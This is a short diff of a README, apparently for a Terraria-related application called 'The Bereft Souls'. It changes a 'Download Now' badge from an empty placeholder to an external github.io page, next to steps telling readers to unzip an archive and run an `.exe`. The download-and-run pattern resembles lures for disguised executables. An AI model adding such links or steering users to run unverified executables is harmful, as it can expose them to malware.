@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://terraria-the-bereft-souls.github.io/.github/)
 
 ## 📸 Overview
 <img width="1280" height="640" alt="terraria-bereftsouls-bosses" src="https://github.com/user-attachments/assets/3ac09eeb-5711-4106-b7a4-7a9191fd67e0" />
